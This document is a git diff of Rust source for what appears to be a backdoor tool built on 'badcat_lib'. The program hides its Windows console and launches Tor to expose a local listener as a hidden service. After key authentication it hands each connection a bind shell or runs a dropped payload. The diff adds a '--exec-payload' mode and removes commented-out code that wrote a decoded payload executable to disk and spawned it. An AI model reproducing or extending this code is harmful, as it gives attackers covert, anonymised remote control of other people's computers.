@@ -2,30 +2,36 @@
 #![windows_subsystem = "windows"]
 
 mod config;
+mod payload;
 mod setting;
 
+use std::{env, fs};
+use std::error::Error;
+use std::io::{Read, Write};
 use std::net::{TcpListener, TcpStream};
 use std::path::PathBuf;
-use std::process::{Child, Command, Stdio};
-use std::{error};
-use std::io::{Read, Write};
+use std::process::{Command, Stdio};
+
+use setting::Setting;
 
 use badcat_lib::io;
 use tor::Tor;
 
-fn main() -> Result<(), Box<dyn error::Error>> {
-    let setting = setting::Setting::new()?;
+fn main() -> Result<(), Box<dyn Error>> {
+    let setting = Setting::new()?;
+
+    let argument = env::args().nth(1).unwrap_or("".to_owned());
+
+    if argument.eq("--exec-payload") {
+        return payload::execute(&setting)
+    }
 
     start_tcp_server(&setting)?;
 
     Ok(())
 }
 
-fn unbundle_torrc(
-    path: &PathBuf,
-    port: u16,
-    setting: &setting::Setting,
-) -> Result<(), Box<dyn error::Error>> {
+fn unbundle_torrc(path: &PathBuf, port: u16, setting: &Setting) -> Result<(), Box<dyn Error>> {
     let mut contents = setting.torrc.clone();
 
     contents = contents.replace("@{DATA_DIR}", setting.tor_dir.to_str().unwrap());
@@ -42,15 +48,12 @@ fn unbundle_torrc(
 
     contents = contents.replace("@{SERVICE_ADDR}", &format!("127.0.0.1:{}", port));
 
-    std::fs::write(&path, &contents)?;
+    fs::write(&path, &contents)?;
 
     Ok(())
 }
 
-fn start_tor(
-    config: &PathBuf,
-    setting: &setting::Setting,
-) -> Result<Tor, Box<dyn error::Error>> {
+fn start_tor(config: &PathBuf, setting: &Setting) -> Result<Tor, Box<dyn Error>> {
     // Fix directory permission - linux build requires this
     if cfg!(unix) || cfg!(macos) {
         let status = Command::new("chmod")
@@ -65,12 +68,13 @@ fn start_tor(
     }
 
     let tor = Tor::new(config);
-    
+
     Ok(tor)
 }
 
-fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
+fn start_tcp_server(setting: &Setting) -> Result<(), Box<dyn Error>> {
     let listener = TcpListener::bind("127.0.0.1:0")?;
+
     let port = listener.local_addr()?.port();
     println!("listening at: {:?}", port);
 
@@ -78,28 +82,18 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
     unbundle_torrc(&config, port, &setting)?;
 
     let tor = start_tor(&config, &setting)?;
-    
-    let mut payload_proc: Option<Child> = None;
 
     for stream in listener.incoming() {
         match stream {
             Ok(mut stream) => {
                 if let Ok(()) = authenticate(&mut stream, &setting) {
                     if setting.uses_payload {
-                        if let Some(proc) = &mut payload_proc {
-                            proc.kill().unwrap_or_else(|_| {
-                                //
-                            });
+                        // Triggers the payload to execute
+                        if let Err(err) = payload::from_process() {
+                            println!("problem creating payload process: {:?}", err);
                         }
-
-                        // if let Ok(proc) = execute_payload(setting) {
-                        //     payload_proc = Some(proc);
-                        // }
-                    } else {
-                        match bind_shell(stream) {
-                            Ok(()) => {}
-                            Err(error) => println!("connection error: {:?}", error),
-                        };
+                    } else if let Err(error) = bind_shell(stream) {
+                        println!("connection error: {:?}", error);
                     }
                 }
             }
@@ -112,10 +106,7 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
     Ok(())
 }
 
-fn authenticate(
-    stream: &mut TcpStream,
-    setting: &setting::Setting,
-) -> Result<(), Box<dyn error::Error>> {
+fn authenticate(stream: &mut TcpStream, setting: &Setting) -> Result<(), Box<dyn Error>> {
     let mut buf = Vec::new();
 
     // allocate a buffer size of key length
@@ -148,7 +139,7 @@ fn authenticate(
     }
 }
 
-fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
+fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn Error>> {
     let mut args: Vec<&str> = Vec::new();
 
     let shell = if cfg!(windows) {
@@ -185,27 +176,3 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
 
     Ok(())
 }
-
-// fn execute_payload(
-//     setting: &setting::Setting
-// ) -> Result<Child, Box<dyn error::Error>> {
-//     let payload = setting::decode_payload(setting)?;
-
-//     let payload_dir = setting.tor_dir.join("payload");
-
-//     if !payload_dir.exists() {
-//         fs::create_dir(&payload_dir)?;
-//     }
-
-//     let executable = executable_name(setting, Some(&payload_dir));
-
-//     {
-//         let mut file = File::create(&executable)?;
-//         file.write(&payload.data)?;
-//         file.flush()?;
-//     }
-
-//     let proc = Command::new(executable).spawn()?;
-
-//     Ok(proc)
-// }
